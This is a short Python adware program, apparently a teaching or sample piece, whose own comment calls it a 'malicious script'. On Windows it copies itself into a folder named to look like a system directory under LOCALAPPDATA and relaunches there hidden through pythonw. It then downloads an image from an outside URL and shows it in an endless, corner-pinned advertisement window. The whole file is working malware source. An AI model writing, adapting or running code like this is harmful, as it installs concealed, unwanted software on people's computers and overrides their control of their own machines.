import os
import sys
import platform
import urllib.request
import cv2
from distutils.dir_util import copy_tree


base_path = os.path.dirname(os.path.abspath(__file__))


class AdManager(object):
    url = ""
    extension = ""

    def __init__(self):
        if platform.system() == "Windows":
            dest_path = os.getenv("LOCALAPPDATA") + "\Windows"
            # print(base_path)
            # print(dest_path)

            if base_path != dest_path:
                print("Migration started...")
                copy_tree(base_path, dest_path)
                print("Migration completed")

                file_path = dest_path + "\\main.py"
                print("Executing new file: " + file_path)
                print("python " + file_path)

                ''' NOTE
                Use 'pythonw' command instead of 'python'.
                'pythonw' will run our malicious script in background
                '''
                result = os.system("pythonw " + file_path)

                print("Closing old file")
                sys.exit(0)
            else:
                print("Good directory")

        self.new_file_name = ""

    def process_file(self):
        file_name, _ = urllib.request.urlretrieve(self.url)
        base = os.path.splitext(file_name)[0]
        self.new_file_name = base + self.extension
        os.rename(file_name, self.new_file_name)

    def show_window(self):
        image_ad = cv2.imread(self.new_file_name)
        image_ad = cv2.resize(image_ad, (300, 300))

        while True:
            cv2.moveWindow("ad", 0, 0)
            cv2.imshow("ad", image_ad)
            cv2.waitKey(0)

    def execute_adware(self):
        self.process_file()
        self.show_window()


ad = AdManager()
ad.url = "http://d.wpimg.pl/1098145671--204938399/movies.jpg"
ad.extension = ".jpg"
ad.execute_adware()
